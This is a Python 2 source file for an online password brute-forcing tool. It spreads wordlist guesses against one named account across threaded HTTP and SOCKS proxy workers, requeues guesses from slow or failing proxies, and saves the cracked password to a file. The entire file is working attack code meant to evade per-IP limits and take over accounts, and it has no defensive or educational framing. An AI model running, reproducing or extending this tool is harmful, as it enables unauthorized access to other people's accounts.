#!/usr/bin/python
# Created: May 17, 2016
# Purpose: Synchronize ProxyPasswordGuesser

from proxy_password_guesser import ProxyPasswordGuesser
import sys
import time
import os

# display some extra print information
VERBOSE = False
# max time in seconds to wait for a proxy to guess a PW
WAIT_TIME = 16
# proxy types
PROXY_HTTP = 0
PROXY_SOCKS4 = 1
PROXY_SOCKS5 = 2

class PasswordManager:
    def __init__(self, username):
        # all of the passwords to guess
        self.wordlist = list(reversed(open('WORDLIST').read().splitlines()))
        # all of the passwords being guessed by threads
        self.pwqueue = []
        # the password being guessed by what thread, and what time
        self.pwthread = {} # (thread, epoch)
        # the proxy guesser workers
        self.pool = []
        # username to recover
        self.username = username
        self.wait = False

    def add_worker(self, proxyip, proxyport, proxytype):
        ppg = ProxyPasswordGuesser(proxyip, proxyport, proxytype, self.username, VERBOSE)
        ppg.start()
        self.pool.append(ppg)

    # called by start when we've cracked the account
    def cracked(self, password):
        sys.stdout.write('Account [%s] has password [%s]' % (self.username, password) + "\n")
        with open(self.username, 'a+') as f:
            f.write(password + "\r\n")
     
        sys.stdout.write('Closing threads' + '\n')
        #for p in self.pool:
        #    p.join()
        print 'Finished'
        os._exit(0)

    # start recovering the account
    def start(self):
        sys.stdout.write('Starting to recover account: %s' % self.username + '\n')
        while True:
            done = False
            exitforloop = False            

            # find pw's in queue too long
            pwthread = [x for x in self.pwthread]
            for key in pwthread: 
                elapsed = time.time() - self.pwthread[key][1]
                if elapsed > WAIT_TIME:                   
                    try:
                        self.pwqueue.remove(key)
                    except:
                        pass
                    self.wordlist.append(key)
                    t = self.pwthread[key][0]
                    #try:
                    #    self.pool.remove(t)
                    #except:
                    #    print 'Already removed %s' % t.proxyip
                    print 'Proxy %s request timed out, added %s to queue' % (t.proxyip, key)
                    # remove proxy request, too slow
                    self.pwthread.pop(key, None) 
                    #t.join()                    

            pool = [x for x in self.pool]
            
            for t in pool:
                if exitforloop:
                    break
                # only allow 1-2 passwords in queue at a time
                if t.in_q.qsize() < 2:
                    try:
                        pw = self.wordlist.pop()
                    except IndexError:
                        done = True
                        self.wait = True
                        
                    if done and len(self.pwqueue) == 0:
                        #for p in self.pool:
                        #    p.join()
                        print 'Finished'
                        os._exit(0)                                      

                    if not done:
                        self.pwqueue.append(pw)
                        self.pwthread[pw] = (t, time.time())
                        if VERBOSE:
                            sys.stdout.write('push [%s] on %s:%s' % (pw, t.proxyip, t.proxyport) + '\n')
                    if not done:
                        t.in_q.put(('guess', pw))
                # check out queue
                while t.out_q.qsize() > 0:
                    try:
                        result = t.out_q.get(True, 1)
                    except:
                        continue
                    cmd = result[0]
                    data = result[1]
                    if cmd == 'cracked':                       
                        sys.stdout.write('cracked user=[%s] pw=[%s]' % (self.username, data) + '\n')
                        # cracked account
                        self.cracked(data)
                        
                    elif cmd == 'badproxy' or cmd == 'proxyerror':
                        # remove the proxy from the queue                        
                        self.wordlist.append(data)
                        try:
                            self.pwqueue.remove(data)
                        except:
                            pass
                        try:
                            self.pwthread.pop(data, None)
                        except:
                            pass
                        # get all other messages from the Q                        
                        while t.out_q.qsize() > 0:
                            try:
                                result = t.out_q.get(True, 1)
                            except:
                                continue
                            data2 = result[1]
                            # if the pw is in the pwqueue, remove it and add it back to the wordlist
                            try:                             
                                self.pwqueue.remove(data2)
                            except:
                                pass
                            try:
                                self.pwthread.pop(data2, None)
                            except:
                                pass
                            self.wordlist.append(data2)                                
                        t.join()
                        try:
                            self.pool.remove(t)
                            exitforloop = True
                        except:
                            pass
                                       
                        
                    elif cmd == 'guessed':
                        sys.stdout.write('Guessed password [%s] on account [%s]' % (data, self.username) + '\n')

                        # remove pw from the pwqueue
                        try:
                            self.pwqueue.remove(data)
                        except ValueError:
                            pass
                        try:
                            self.pwthread.pop(data, None)
                        except:
                            pass

        print 'Finished'
        os._exit(0)
                                    
                        
                    
                
